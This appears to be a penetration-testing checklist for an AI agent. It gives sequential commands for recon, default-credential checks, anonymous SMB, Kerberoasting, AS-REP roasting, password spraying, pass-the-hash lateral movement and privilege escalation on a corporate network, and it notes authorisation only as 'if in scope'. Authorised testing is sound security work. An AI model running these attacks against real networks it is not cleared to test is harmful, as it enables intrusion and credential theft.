---
category: methodology
title: "Infrastructure and Network Pentest"
tags: [checklist, infrastructure, network, active-directory, lateral-movement, kerberoasting, corporate, sequential]
---

# Infrastructure and Network Pentest

You have access to a corporate network.

## Passive recon (no active scanning yet)

```bash
ip route                          # local subnets
arp -a                            # neighbors in the segment
cat /etc/resolv.conf              # DNS servers → often AD controllers
nslookup -type=SRV _ldap._tcp     # find Domain Controller
```

→ `save_scope()` for every discovered subnet

## Host inventory

```bash
nmap -sn 10.0.0.0/24 -oG - | grep "Up"
nmap -sV -p 22,80,443,445,3389,8080,8443 <subnet> --open -oN scan.txt
```

Priorities: domain controllers (88/389/636), web servers, databases, DevOps (8080, 9090, 2375).
→ `save_scope()` for each service found

## Low-hanging fruit (quick wins)

```bash
# Default credentials
# Jenkins: admin/admin   Tomcat: tomcat/tomcat   Routers: admin/admin

# Anonymous SMB access?
smbclient -L //<ip> -N
smbmap -H <ip>

# Database with no password?
mysql -h <ip> -u root --password=""
```

→ `save_finding()` for any successful default credential

## Known CVEs in discovered services

```bash
nmap -sV --version-intensity 5 <targets>
searchsploit "<service> <version>"
```

Priority targets: SMB (EternalBlue on Win7/2008), Exchange, Confluence, GitLab, Jenkins.
→ `save_hypothesis()` for each version with known CVEs

## Credential attacks (if in scope)

```bash
# Kerberoasting
GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC> -request

# AS-REP Roasting
GetNPUsers.py <domain>/ -dc-ip <DC> -no-pass -usersfile users.txt

# Password spray (1 password × many users, slow!)
kerbrute passwordspray --dc <DC> -d <domain> users.txt 'Winter2024!'
```

→ `save_credential()` for found credentials

## Lateral movement

```bash
crackmapexec smb <subnet> -u <user> -p <pass>
crackmapexec winrm <subnet> -u <user> -p <pass>
# Pass-the-hash
crackmapexec smb <subnet> -u Administrator -H <hash>
```

→ `save_hypothesis()` for each new host with access

## Privilege escalation on owned hosts

- **Linux**: run LinPEAS, check `sudo -l`, SUID binaries, cron jobs, capabilities
- **Windows**: run WinPEAS, check `SeImpersonatePrivilege` (Potato), unquoted service paths, weak ACLs

→ `save_finding()` for each path to admin/SYSTEM/root

**Done when:** all subnets scanned, default creds checked, versions checked against CVEs, AD attacks executed if in scope.
